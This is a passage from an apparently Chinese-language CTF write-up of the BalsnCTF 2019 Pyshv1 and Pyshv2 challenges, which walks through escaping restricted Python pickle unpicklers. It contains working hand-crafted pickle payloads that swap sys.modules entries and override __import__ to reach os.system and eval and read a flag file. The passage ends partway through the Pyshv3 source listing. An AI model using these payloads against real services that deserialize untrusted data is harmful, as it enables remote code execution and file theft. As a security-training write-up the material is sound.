class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">&#x27;sys&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pysh</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.login()</span><br><span class="line">        <span class="variable language_">self</span>.cmds = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">self</span>):</span><br><span class="line">        user = <span class="built_in">input</span>().encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = <span class="built_in">input</span>(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">            func = <span class="variable language_">self</span>.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;pysh: &#x27;</span> + req + <span class="string">&#x27;: command not found&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br></pre></td></tr></table></figure>
<p>限制了导入的模块只能是 sys，问题是这个模块也不安全呀 ：）</p>
<blockquote>
<p>sys.modules</p>
<p>This is a dictionary that maps module names to modules which have  already been loaded. This can be manipulated to force reloading of  modules and other tricks. However, replacing the dictionary will not  necessarily work as expected and deleting essential items from the  dictionary may cause Python to fail.</p>
</blockquote>
<p>如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库是默认被加载进来的，例如 os，但是不能直接使用，原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。</p>
<p>这里的 find_class 直接调的 <a target="_blank" rel="noopener" href="http://pickle.py">pickle.py</a> 中的方法，那就先看看它如何导入包的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pickle.Unpickler.find_class</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">    <span class="comment"># Subclasses may override this.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>.proto &lt; <span class="number">3</span> <span class="keyword">and</span> <span class="variable language_">self</span>.fix_imports:</span><br><span class="line">        <span class="keyword">if</span> (module, name) <span class="keyword">in</span> _compat_pickle.NAME_MAPPING:</span><br><span class="line">            module, name = _compat_pickle.NAME_MAPPING[(module, name)]</span><br><span class="line">        <span class="keyword">elif</span> module <span class="keyword">in</span> _compat_pickle.IMPORT_MAPPING:</span><br><span class="line">            module = _compat_pickle.IMPORT_MAPPING[module]</span><br><span class="line">    <span class="built_in">__import__</span>(module, level=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>.proto &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> _getattribute(sys.modules[module], name)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br></pre></td></tr></table></figure>
<p>其中 sys.modules 为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;	</span><br><span class="line">    <span class="string">&#x27;sys&#x27;</span>: &lt; module <span class="string">&#x27;sys&#x27;</span>(built - <span class="keyword">in</span> ) &gt; ,</span><br><span class="line">    <span class="string">&#x27;builtins&#x27;</span>: &lt; module <span class="string">&#x27;builtins&#x27;</span>(built - <span class="keyword">in</span> ) &gt; ,</span><br><span class="line">    <span class="string">&#x27;os&#x27;</span>: &lt; module <span class="string">&#x27;os&#x27;</span></span><br><span class="line">    <span class="keyword">from</span> <span class="string">&#x27;C:\\Users\\wywwzjj\\AppData\\Local\\Programs\\Python\\Python37\\lib\\os.py&#x27;</span> &gt; ,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那我们的目标：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cos\nsystem  &lt;=&gt; <span class="built_in">getattr</span>(sys.modules[<span class="string">&#x27;os&#x27;</span>], <span class="string">&#x27;system&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>限制了 module 只能为 sys，那能否把 sys.modules[‘sys’]替换为sys.modules[‘os’]，从而引入危险模块。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> modules</span><br><span class="line">modules[<span class="string">&#x27;sys&#x27;</span>] = modules[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> system</span><br></pre></td></tr></table></figure>
<p>本地实验一下，成功：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\wywwzjj&gt; python</span><br><span class="line">Python <span class="number">3.7</span><span class="number">.4</span> (tags/v3<span class="number">.7</span><span class="number">.4</span>:e09359112e, Jul  <span class="number">8</span> <span class="number">2019</span>, <span class="number">20</span>:<span class="number">34</span>:<span class="number">20</span>) [MSC v<span class="number">.1916</span> <span class="number">64</span> bit (AMD64)] on win32</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> sys <span class="keyword">import</span> modules</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>modules[<span class="string">&#x27;sys&#x27;</span>] = modules[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> sys <span class="keyword">import</span> system</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>system(<span class="string">&#x27;dir&#x27;</span>)</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 F497-F727</span><br><span class="line"></span><br><span class="line"> C:\Users\wywwzjj 的目录</span><br><span class="line"></span><br><span class="line"><span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>  <span class="number">20</span>:<span class="number">36</span>    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>  <span class="number">20</span>:<span class="number">36</span>    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">2019</span>/08/<span class="number">22</span>  <span class="number">21</span>:02             <span class="number">2</span>,<span class="number">750</span> .aggressor.prop</span><br><span class="line"><span class="number">2019</span>/09/<span class="number">16</span>  <span class="number">00</span>:09    &lt;DIR&gt;          .anaconda</span><br><span class="line"><span class="number">2019</span>/04/09  <span class="number">13</span>:<span class="number">58</span>    &lt;DIR&gt;          .android</span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">13</span>  <span class="number">14</span>:<span class="number">37</span>    &lt;DIR&gt;          .astropy</span><br><span class="line"><span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>  <span class="number">20</span>:<span class="number">36</span>            <span class="number">18</span>,<span class="number">465</span> .bash_history</span><br><span class="line"><span class="number">2019</span>/04/07  <span class="number">12</span>:03    &lt;DIR&gt;          .CLion2019<span class="number">.1</span></span><br></pre></td></tr></table></figure>
<p>还有个小麻烦，modules 是个 dict，无法直接取值。继续利用 getattr(sys.modules[module], name)。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;sys&#x27;</span>] = sys.modules</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(sys)  <span class="comment"># 成功导入 dict 对象</span></span><br><span class="line">[<span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__contains__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__delitem__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__getitem__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>, <span class="string">&#x27;__iter__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__len__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__setitem__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;clear&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;fromkeys&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;items&#x27;</span>, <span class="string">&#x27;keys&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;popitem&#x27;</span>, <span class="string">&#x27;setdefault&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;values&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(sys, <span class="string">&#x27;get&#x27;</span>)  <span class="comment"># 结合 find_class 中的 getattr</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> method get of <span class="built_in">dict</span> <span class="built_in">object</span> at <span class="number">0x000002622D052688</span>&gt;</span><br></pre></td></tr></table></figure>
<p>改写成 pickle：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">csys</span><br><span class="line">modules</span><br><span class="line">p100</span><br><span class="line">S<span class="string">&#x27;sys&#x27;</span></span><br><span class="line">g100</span><br><span class="line">scsys</span><br><span class="line">get</span><br><span class="line">(S<span class="string">&#x27;os&#x27;</span></span><br><span class="line">tRp101</span><br><span class="line">0S<span class="string">&#x27;sys&#x27;</span></span><br><span class="line">g101</span><br><span class="line">scsys</span><br><span class="line">system</span><br><span class="line">(S<span class="string">&#x27;dir&#x27;</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
<h2 id="BalsnCTF-2019-Pyshv2">BalsnCTF 2019 Pyshv2</h2>
<blockquote>
<p>环境： <a target="_blank" rel="noopener" href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">&#x27;The pickle is spoilt :(&#x27;</span>)</span><br><span class="line">        module = <span class="built_in">__import__</span>(module)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getattr</span>(module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">&#x27;structs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pysh</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.login()</span><br><span class="line">        <span class="variable language_">self</span>.cmds = &#123;</span><br><span class="line">            <span class="string">&#x27;help&#x27;</span>: <span class="variable language_">self</span>.cmd_help,</span><br><span class="line">            <span class="string">&#x27;flag&#x27;</span>: <span class="variable language_">self</span>.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">self</span>):</span><br><span class="line">        user = <span class="built_in">input</span>().encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = <span class="built_in">input</span>(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">            func = <span class="variable language_">self</span>.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;pysh: &#x27;</span> + req + <span class="string">&#x27;: command not found&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cmd_help</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Available commands: &#x27;</span> + <span class="string">&#x27; &#x27;</span>.join(<span class="variable language_">self</span>.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cmd_su</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class="line">        <span class="comment"># self.user.privileged = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cmd_flag</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># File: structs.py 为空</span></span><br></pre></td></tr></table></figure>
<p>真会玩，给你一个空模块：），先看下空模块有哪些内置方法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>structs = <span class="built_in">__import__</span>(<span class="string">&#x27;structs&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>structs</span><br><span class="line">&lt;module <span class="string">&#x27;structs&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;C:\\Users\\wywwzjj\\structs.py&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(structs)</span><br><span class="line">[<span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(structs, <span class="string">&#x27;__builtins__&#x27;</span>)[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br></pre></td></tr></table></figure>
<p>好了，问题又转变为如何获取键值，还是比较艰难。</p>
<p>查文档时又发现了一个东西，原来 <strong>import</strong> 可被覆盖。</p>
<blockquote>
<p><strong>import</strong>(name, globals=None, locals=None, fromlist=(), level=0)</p>
<p>此函数会由 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/reference/simple_stmts.html#import">import</a> 语句发起调用。 它可以被替换 (通过导入 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/builtins.html#module-builtins">builtins</a> 模块并赋值给 builtins.<strong>import</strong>) 以便修改 import 语句的语义，但是 强烈 不建议这样做，因为使用导入钩子 (参见 <a target="_blank" rel="noopener" href="https://www.python.org/dev/peps/pep-0302">PEP 302</a>) 通常更容易实现同样的目标，并且不会导致代码问题，因为许多代码都会假定所用的是默认实现。 同样也不建议直接使用 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/functions.html#__import__"><strong>import</strong>()</a> 而应该用 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/importlib.html#importlib.import_module">importlib.import_module()</a>。</p>
</blockquote>
<p>那该覆盖成什么函数呢？最好是 <strong>import</strong>(module) 后能返回字典的函数。</p>
<p>只能从内置函数下手了，一个一个试吧，发现没一个能用的。</p>
<p>后来又想起还有一堆魔术方法没有试，又是一篇广阔的天地。</p>
<p><a target="_blank" rel="noopener" href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html">https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html</a></p>
<p><a target="_blank" rel="noopener" href="https://p3.ssl.qhimg.com/t01a7a5f8b2d1318c46.jpg"><img src="https://p3.ssl.qhimg.com/t01a7a5f8b2d1318c46.jpg" alt="img"></a></p>
<p>这个 <strong>getattribute</strong> 恰好能符合我们的要求，真棒。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(structs, <span class="string">&#x27;__getattribute__&#x27;</span>)(<span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line">&#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="string">&quot;Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil&#x27; object; Ellipsis represents `...&#x27; in slices.&quot;</span>, <span class="string">&#x27;__package__&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;, <span class="string">&#x27;__spec__&#x27;</span>: ModuleSpec(name=<span class="string">&#x27;builtins&#x27;</span>, loader=&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;),...</span><br></pre></td></tr></table></figure>
<p>再理下思路：（伪代码）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">d = <span class="built_in">getattr</span>(structs, <span class="string">&#x27;__builtins__&#x27;</span>)  	 <span class="comment"># 获取到字典，先存起来</span></span><br><span class="line"><span class="built_in">getattr</span>(structs, <span class="string">&#x27;__import__&#x27;</span>) = <span class="built_in">getattr</span>(structs, <span class="string">&#x27;__getattribute__&#x27;</span>)  <span class="comment"># 覆盖 __import__</span></span><br><span class="line"><span class="built_in">setattr</span>(structs, <span class="string">&#x27;structs&#x27;</span>, d)  		 <span class="comment"># 创建个 structs 的属性，字典写入该属性</span></span><br><span class="line">mo = <span class="built_in">__import__</span>(structs)				 <span class="comment"># 此时的 mo 就是我们之前的 __builtins__</span></span><br><span class="line"><span class="built_in">getattr</span>(mo, <span class="string">&#x27;get&#x27;</span>)  			 	 	 <span class="comment"># 获取到 get 方法，然后就可以按照 pyshv1 的思路来了</span></span><br></pre></td></tr></table></figure>
<p>转换为 pickle：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">cstructs</span><br><span class="line">__getattribute__</span><br><span class="line">p100</span><br><span class="line">0cstructs</span><br><span class="line">__dict__</span><br><span class="line">S&#x27;structs&#x27;</span><br><span class="line">cstructs</span><br><span class="line">__builtins__						# 先添加 structs 属性</span><br><span class="line">p101</span><br><span class="line">sg101</span><br><span class="line">S&#x27;__import__&#x27;</span><br><span class="line">g100</span><br><span class="line">scstructs</span><br><span class="line">get</span><br><span class="line">(S&#x27;eval&#x27;</span><br><span class="line">tR(S&#x27;print(open(&quot;../flag&quot;).read())&#x27;   # 这里已经不能 __import__(&#x27;os&#x27;) 了，能继续执行命令吗：）</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
<h2 id="BalsnCTF-2019-Pyshv3">BalsnCTF 2019 Pyshv3</h2>
<blockquote>
<p>环境： <a target="_blank" rel="noopener" href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv3">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv3</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span 